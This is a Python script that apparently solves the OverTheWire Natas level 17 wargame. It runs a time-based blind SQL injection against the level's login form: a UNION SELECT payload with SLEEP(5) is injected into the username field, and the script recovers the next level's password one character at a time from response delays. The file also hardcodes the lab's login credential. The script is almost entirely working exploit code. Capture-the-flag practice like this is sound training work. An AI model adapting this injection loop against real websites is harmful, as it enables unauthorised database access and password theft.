import requests
import time
#Function to stablish connection
def start_session(username,password,url):
    session = requests.Session()
    r = session.post(url,auth=(username, password))
    return session


def guess_pass(username,password,url):
    characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
    contador = 0
    length = 1
    final_password = ''
    while True:
        if contador >=32:
            break
        for char in characters: 
            print(f'we are trying with {final_password+char} for {final_password}')
            start_time = time.time()
            payload = {'debug':'True','username':"\" UNION SELECT NULL, if((SELECT COUNT(*) FROM users WHERE BINARY SUBSTRING(password,1,"+str(length)+") = \""+ final_password+char +"\" AND username =\"natas18\"), SLEEP(5), NULL) OR \"1=1" }
            r = session.post(url,auth=(username, password),data=payload)
            end_time = time.time()
            duration = end_time - start_time
            if duration > 4:
                final_password += char
                print(f'we found the following letter {char}, and the password might be {final_password}')
                break
        contador +=1
        length += 1
    return final_password
    



if __name__ == "__main__" :
    username = "natas17"
    password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
    url = "http://natas17.natas.labs.overthewire.org/index.php?debug=true"
    session = start_session(username,password,url)
    fp=guess_pass(username,password,url)
    print(f'the final password is {fp}')